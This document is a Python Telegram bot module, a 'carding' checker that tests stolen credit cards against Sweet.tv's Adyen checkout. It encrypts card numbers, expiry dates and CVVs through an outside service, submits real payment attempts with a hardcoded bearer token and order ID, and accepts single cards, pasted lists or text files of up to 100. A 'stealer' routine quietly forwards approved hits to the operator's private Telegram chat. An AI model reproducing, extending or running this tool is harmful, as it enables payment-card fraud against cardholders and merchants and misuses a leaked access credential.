import time
import asyncio
import re
import os
import httpx
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Adyen charge"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Sweet.tv's specific Adyen Public Key
ADYEN_KEY = (
    '10001|BA9A9BA9D9E86B4E52BD373DE6585E5C3B0E0F48C8712347F22F46C9CFE2032DC6D72F1545835E529'
    'AB7852D18B1E7FD0BAFDE43DA7B966498F98035AA5B1C65A6554ADE587E0CB8E8594DC696D44BBE182BDE0'
    '79DCC011D79EE693F8ED7937546180F9D0061517F9066327BFF651383D3F1683B9943C144039BF3738CA7E0'
    'CABE2BC9B322A25764A12DA013697660C3430F5DAABF2148ABD6665387B99F7CAA242003EBCEA86189E49D5'
    'A24A8FE671540058D02DB3C9A929BF59100D0A74EF89EF2A737D6A77625707016EDF0ACCD1BB486D02A7EE'
    'CE6E60047F32715B611AFEBA748B0BA300312AE631A07F468F06190DCA197E5A7D22A1D72A1CD6D572F63'
)

# Bearer token (should be kept fresh; you can update it when needed)
BEARER_TOKEN = (
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2FwaS5zd2VldC50diIsInN1YiI6IjEwMjMxNjI0ODgiLCJleHAiOjE3NzIzMTQyNzcsImlhdCI6MTc3MjMwMzQ3NywianRpIjoiNjM4YjJhM2EtNjhhYS00MzRjLTkwMDQtNDc5MTc0ZTg4OGU5IiwiYWNjb3VudF9udW1iZXIiOjMzMTYyNDEzLCJiaWxsaW5nX2lkIjoxLCJwcm9maWxlX2lkIjoiT3FtY0MiLCJkZXZpY2UiOnsidHlwZSI6MjIsImZpcm13YXJlIjp7InZlcnNpb25Db2RlIjoxLCJ2ZXJzaW9uU3RyaW5nIjoiNy4zLjQ0In0sInN1Yl90eXBlIjowLCJtb2RlbCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsInV1aWQiOiI0NmQ2YjQyMC0wODAwLTRlNTAtODBlMy01NDY1ODllYTEwMzYiLCJzY3JlZW5faW5mbyI6eyJ3aWR0aCI6MzYwLCJoZWlnaHQiOjgyMCwiYXNwZWN0UmF0aW8iOjB9LCJhcHBsaWNhdGlvbiI6eyJ0eXBlIjoyfSwic3VwcG9ydGVkX2RybSI6eyJ3aWRldmluZV9tb2R1bGFyIjp0cnVlfX0sImlwIjoiMTU0LjE1OS4yMzcuMjE4IiwiY291bnRyeV9jb2RlIjoiS0UifQ.h47KLms2b4syo4ibDoo9_mMtxVuaRuXG3gwZXSbgfOw"
)

ENCRYPTION_API = "https://pladixjwk.vercel.app/api/adyen"
PAYMENT_API = "https://checkout.sweet.tv/v1/adyen/payment"

# Owner DM link and clickable symbol
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

# -------------------------------------------------------------
# Helper Functions
# -------------------------------------------------------------
def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

async def get_adyen_encryption(cc, mm, yy, cvv):
    """Encrypt card details using Adyen public key"""
    yy_full = f"20{yy}" if len(yy) == 2 else yy
    payload = {
        'context': ADYEN_KEY,
        'cc': cc,
        'mes': mm,
        'ano': yy_full,
        'cvv': cvv
    }
    async with httpx.AsyncClient(timeout=30) as client:
        try:
            resp = await client.post(ENCRYPTION_API, json=payload)
            if resp.status_code == 200:
                return resp.json()
            else:
                return None
        except:
            return None

async def send_payment(enc_data, card_brand):
    """Send payment request to Sweet.tv"""
    headers = {
        "authorization": BEARER_TOKEN,
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "content-type": "application/json",
        "x-device": "2;22;0;2;7.3.44",
        "origin": "https://sweet.tv",
        "referer": "https://sweet.tv/"
    }
    payload = {
        "orderId": 53188320,
        "paymentMethod": {
            "type": "scheme",
            "holderName": "Mokua",
            "encryptedCardNumber": enc_data["encryptedCardNumber"],
            "encryptedExpiryMonth": enc_data["encryptedExpiryMonth"],
            "encryptedExpiryYear": enc_data["encryptedExpiryYear"],
            "encryptedSecurityCode": enc_data["encryptedSecurityCode"],
            "brand": card_brand,
            "checkoutAttemptId": "12d24ce6-2b0d-4136-97a4-e5112b2e5d7c1772305401543B4B54CF884296541A6146A6C61859A5038323B51CD94214CB0F7720494E8ACE0"
        },
        "browserInfo": {
            "acceptHeader": "*/*",
            "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "timeZoneOffset": -180
        }
    }
    async with httpx.AsyncClient(timeout=45) as client:
        try:
            resp = await client.post(PAYMENT_API, headers=headers, json=payload)
            return resp
        except Exception as e:
            return None

# -------------------------------------------------------------
# Stealer function (only gateway, response, time, checked by, owner)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# API caller (full card check)
# -------------------------------------------------------------
async def check_adyen_card(fullcc):
    """Full check: encrypt and pay, returns (status, message, gateway)"""
    parts = fullcc.split('|')
    if len(parts) != 4:
        return "Error", "Invalid format", GATE_NAME
    cc, mm, yy, cvv = parts

    # Encrypt
    enc = await get_adyen_encryption(cc, mm, yy, cvv)
    if not enc or not enc.get("encryptedCardNumber"):
        return "Error", "Encryption failed", GATE_NAME

    # Determine brand
    card_brand = "mc" if cc.startswith('5') else "visa"

    # Pay
    resp = await send_payment(enc, card_brand)
    if resp is None:
        return "Error", "No response from payment gateway", GATE_NAME

    try:
        data = resp.json()
    except:
        return "Error", f"Invalid JSON (HTTP {resp.status_code})", GATE_NAME

    result_code = data.get("resultCode", "UNKNOWN")
    refusal_reason = data.get("refusalReason", "")
    additional_data = data.get("additionalData", {})
    refusal_reason_raw = additional_data.get("refusalReasonRaw", "")

    if result_code == "Authorised":
        return "Approved ✅", "Authorised – payment succeeded", GATE_NAME
    elif result_code == "Refused":
        reason = refusal_reason or refusal_reason_raw or "Unknown reason"
        return "Declined ❌", f"Refused : {reason}", GATE_NAME
    elif result_code == "Error":
        return "Error", f"Gateway error: {refusal_reason}", GATE_NAME
    else:
        return "Unknown", f"{result_code} – {refusal_reason}", GATE_NAME

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/ad)
# -------------------------------------------------------------
@Client.on_message(filters.command("ad", [".", "/"]))
async def adyen_single_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /ad

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /ad cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway = await check_adyen_card(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        finalresp = f"""{status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""

        await Client.edit_message_text(
            message.chat.id, 
            thirdcheck.id, 
            finalresp, 
            disable_web_page_preview=True, 
            parse_mode=enums.ParseMode.HTML
        )
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mad)
# -------------------------------------------------------------
@Client.on_message(filters.command("mad", [".", "/"]))
async def adyen_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mad

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mad cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tad)
# -------------------------------------------------------------
@Client.on_message(filters.command("tad", [".", "/"]))
async def adyen_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tad

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved messages, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    # Initial progress message
    progress_text = f"""Adyen - Sweet.tv
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response, gateway = await check_adyen_card(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Adyen - Sweet.tv
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    # Send each approved card as separate message
    for card in approved_cards:
        approved_msg = f"""{card['status']}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
